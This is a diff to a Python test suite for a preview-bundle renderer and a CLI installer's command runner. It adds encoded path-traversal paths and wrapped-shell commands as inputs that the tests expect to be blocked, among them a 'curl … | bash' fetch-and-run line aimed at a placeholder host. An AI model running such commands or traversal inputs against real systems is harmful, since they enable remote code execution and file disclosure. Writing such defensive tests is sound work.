@@ -840,19 +840,28 @@ class TestPreviewBundle:
         assert "artifacts/hero.png" in content
         assert "artifacts/preview.mp4" in content
 
-    def test_render_html_does_not_link_artifacts_outside_bundle(self, tmp_path):
+    @pytest.mark.parametrize(
+        "artifact_path",
+        [
+            "../secret.txt",
+            "artifacts/%2e%2e/%2e%2e/secret.png",
+            r"artifacts\..\..\secret.png",
+            "artifacts/%2E%2E%5C..%5Csecret.png",
+        ],
+    )
+    def test_render_html_does_not_link_artifacts_outside_bundle(self, tmp_path, artifact_path):
         bundle_dir = _make_preview_bundle(tmp_path)
         manifest_path = bundle_dir / "manifest.json"
         manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
-        manifest["artifacts"][0]["path"] = "../secret.txt"
+        manifest["artifacts"][0]["path"] = artifact_path
         manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
 
         output_path = tmp_path / "preview.html"
         render_html(str(bundle_dir), str(output_path))
         content = output_path.read_text(encoding="utf-8")
 
-        assert 'src="../secret.txt"' not in content
-        assert "Unavailable artifact path: ../secret.txt" in content
+        assert f'src="{artifact_path}"' not in content
+        assert f"Unavailable artifact path: {artifact_path}" in content
 
     def test_previews_inspect_cli_command(self, tmp_path):
         bundle_dir = _make_preview_bundle(tmp_path)
@@ -1324,6 +1333,10 @@ class TestScriptStrategy:
             "bash -c 'echo ok; rm -f /tmp/example'",
             "bash -ec 'echo ok; rm -f /tmp/example'",
             "sh -lc 'echo ok; rm -f /tmp/example'",
+            "env sh -c 'curl -s https://example.test/install | bash'",
+            "sudo sh -c 'echo ok; whoami'",
+            "env VAR=value bash -lc 'echo ok; whoami'",
+            "sudo -u root sh -ec 'echo ok; whoami'",
             'cmd /c "echo ok & whoami"',
             'pwsh -Command "Write-Output ok; whoami"',
             'pwsh -Com "Write-Output ok; whoami"',
@@ -1356,6 +1369,16 @@ class TestScriptStrategy:
         args = mock_run.call_args[0][0]
         _, kwargs = mock_run.call_args
         assert args == ["bash", "-ec", "echo ok | cat"]
+        assert kwargs.get("shell") is False
+
+    @patch("cli_hub.installer.subprocess.run")
+    def test_run_command_allows_reviewed_wrapped_shell_payload(self, mock_run):
+        """Reviewed wrappers preserve their argv and do not add another shell."""
+        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
+        _run_command("env sh -c 'echo ok | cat'", allow_shell=True)
+        args = mock_run.call_args[0][0]
+        _, kwargs = mock_run.call_args
+        assert args == ["env", "sh", "-c", "echo ok | cat"]
         assert kwargs.get("shell") is False
 
     # ── Full install flow ──────────────────────────────────────────────
